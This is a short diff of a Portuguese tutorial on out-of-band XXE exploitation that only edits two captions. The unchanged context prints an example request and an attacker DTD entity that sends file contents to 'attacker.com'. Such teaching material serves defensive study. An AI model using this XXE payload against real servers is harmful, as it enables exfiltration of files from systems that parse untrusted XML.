@@ -60,7 +60,7 @@ O processo para explorar a vulnerabilidade XXE Out-of-band (fora da banda) é se
 
 exemplo:
 
-  <p>Request do lado do server alvo</p>
+  <p>Request</p>
 
     POST http://example.com/xml HTTP/1.1
     <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -73,7 +73,7 @@ exemplo:
      ]>
     <data>&send;</data>
   
-  <p>Lado do servidor do atacante. coleta a resposta recebida do server DTD (attacker.com/evil.dtd)</p>
+  <p>DTD do atacante</p>
 
     <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?collect=%file;'>">
     %all;
